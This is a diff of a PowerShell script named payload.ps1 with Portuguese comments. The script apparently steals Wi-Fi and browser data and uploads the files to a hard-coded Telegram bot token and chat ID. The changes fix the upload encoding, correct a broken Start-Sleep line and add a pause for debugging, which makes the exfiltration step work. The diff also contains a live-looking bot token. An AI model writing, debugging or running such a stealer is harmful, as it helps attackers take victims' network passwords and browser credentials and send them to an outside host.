@@ -75,8 +75,7 @@ function Send-TelegramFile {
     $contentType = "multipart/form-data; boundary=$boundary"
     $fileName = [System.IO.Path]::GetFileName($FilePath)
     $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    # Usar Base64 para evitar problemas de codificação
-    $fileContent = [System.Convert]::ToBase64String($fileBytes)
+    $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
     $bodyLines = @(
         "--$boundary",
         "Content-Disposition: form-data; name=`"chat_id`"",
@@ -84,7 +83,7 @@ function Send-TelegramFile {
         $ChatId,
         "--$boundary",
         "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
-        "Content-Type: application/octet-stream",
+        "Content-Type: text/plain",
         "",
         $fileContent,
         "--$boundary--"
@@ -112,8 +111,11 @@ $token = "7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw"
 $chatid = "5400490425"
 Write-Output "Enviando arquivos para o Telegram (Token: $token, ChatID: $chatid)"
 Send-TelegramFile -Token $token -ChatId $chatid -FilePath $wifiFile
-Start  Start-Sleep -Seconds 2
+Start-Sleep -Seconds 2
 Send-TelegramFile -Token $token -ChatId $chatid -FilePath $browserFile
 
 Write-Output "=== Finalizando payload.ps1 em $(Get-Date) ==="
 Stop-Transcript
+# Manter a janela aberta para depuração
+Write-Output "Pressione Enter para sair..."
+Read-Host
